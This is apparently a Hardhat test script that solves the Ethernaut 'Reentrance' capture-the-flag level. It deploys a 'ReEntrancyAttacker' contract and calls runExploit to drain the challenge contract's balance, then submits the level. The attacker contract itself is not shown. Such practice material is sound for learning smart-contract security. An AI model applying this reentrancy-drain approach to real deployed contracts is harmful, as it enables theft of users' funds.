import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Reentrance`);
  const challengeAddress = await createChallenge(
    `0x848fb2124071146990c7abE8511f851C7f527aF4`,
    ethers.utils.parseUnits(`1`, `ether`)
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('ReEntrancyAttacker');
  let attacker = await attackerFactory.connect(eoa).deploy()

  let attackAmount = await ethers.provider.getBalance(challenge.address)
  await attacker.connect(eoa).runExploit(challenge.address,{value:attackAmount})

  console.log((await ethers.provider.getBalance(challenge.address)).toString())

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
